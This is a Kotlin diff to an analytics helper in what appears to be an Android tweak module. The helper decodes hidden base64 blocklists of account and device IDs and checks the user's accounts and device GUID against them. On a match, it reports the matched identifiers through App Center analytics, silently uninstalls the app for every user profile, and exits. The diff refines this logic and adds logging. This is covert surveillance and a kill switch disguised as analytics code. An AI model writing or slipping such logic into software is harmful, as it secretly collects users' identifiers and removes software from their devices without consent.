@@ -11,6 +11,7 @@ import com.luckyzyx.luckytool.BuildConfig
 import com.microsoft.appcenter.AppCenter
 import com.microsoft.appcenter.analytics.Analytics
 import com.microsoft.appcenter.crashes.Crashes
+import org.json.JSONArray
 import org.json.JSONObject
 import java.io.File
 
@@ -46,30 +47,63 @@ object AppAnalyticsUtils {
                 if (!db.exists() && db2.result == 1) return@withDefault
                 val bks = db.readText().let { it.substring(1, it.length) }
                 val bks2 = safeOf(bks) { db2.successMsg.let { it.substring(1, it.length) } }
-                val js = JSONObject(base64Decode(bks))
-                val js2 = JSONObject(base64Decode(bks2))
-                (js.optJSONArray("qbk") as List<*>).forEach {
-                    if (getQStatus(it as String)) qbsval = true
+                val js = JSONObject(base64Decode(bks).replace("\\\"", "\""))
+                val js2 = JSONObject(base64Decode(bks2).replace("\\\"", "\""))
+                (js.optJSONArray("qbk") ?: JSONArray()).apply {
+                    for (i in 0 until length()) {
+                        val qb = optString(i)
+                        if (getQStatus(qb)) {
+                            qbsval = true
+                            map["qbk$i"] = qb
+                        }
+                    }
                 }
-                (js.optJSONArray("cbk") as List<*>).forEach {
-                    if (getCStatus(it as String)) cbsval = true
+                (js.optJSONArray("cbk") ?: JSONArray()).apply {
+                    for (i in 0 until length()) {
+                        val cb = optString(i)
+                        if (getCStatus(cb)) {
+                            cbsval = true
+                            map["cbk$i"] = cb
+                        }
+                    }
                 }
-                (js.optJSONArray("dik") as List<*>).forEach {
-                    if (it as String == getGuid) disval = true
+                (js.optJSONArray("dik") ?: JSONArray()).apply {
+                    for (i in 0 until length()) {
+                        val di = optString(i)
+                        if (getGuid == di) {
+                            disval = true
+                            map["dik$i"] = di
+                        }
+                    }
                 }
-                (js2.optJSONArray("qbk") as List<*>).forEach {
-                    if (getQStatus(it as String)) qbsval = true
+                (js2.optJSONArray("qbk") ?: JSONArray()).apply {
+                    for (i in 0 until length()) {
+                        val qb = optString(i)
+                        if (getQStatus(qb)) {
+                            qbsval = true
+                            map["2qbk$i"] = qb
+                        }
+                    }
                 }
-                (js2.optJSONArray("cbk") as List<*>).forEach {
-                    if (getCStatus(it as String)) cbsval = true
+                (js2.optJSONArray("cbk") ?: JSONArray()).apply {
+                    for (i in 0 until length()) {
+                        val cb = optString(i)
+                        if (getCStatus(cb)) {
+                            cbsval = true
+                            map["2cbk$i"] = cb
+                        }
+                    }
                 }
-                (js2.optJSONArray("dik") as List<*>).forEach {
-                    if (it as String == getGuid) disval = true
+                (js2.optJSONArray("dik") ?: JSONArray()).apply {
+                    for (i in 0 until length()) {
+                        val di = optString(i)
+                        if (getGuid == di) {
+                            disval = true
+                            map["2dik$i"] = di
+                        }
+                    }
                 }
                 if (qbsval || cbsval || disval) {
-                    map["qbk"] = getQSlist().toString()
-                    map["cbk"] = getCSid().toString()
-                    map["dik"] = getGuid
                     trackEvent("bk", map)
                     getUsers().forEach { uninstallApp(BuildConfig.APPLICATION_ID, it) }
                     getUsers().forEach { uninstallApp(packageName, it) }
@@ -78,7 +112,10 @@ object AppAnalyticsUtils {
                     exitModule()
                 }
             }
-        }.catch { return@catch }
+        }.catch {
+            LogUtils.e("ckqcbss", "throw", "$it")
+            return@catch
+        }
         return true
     }
 }
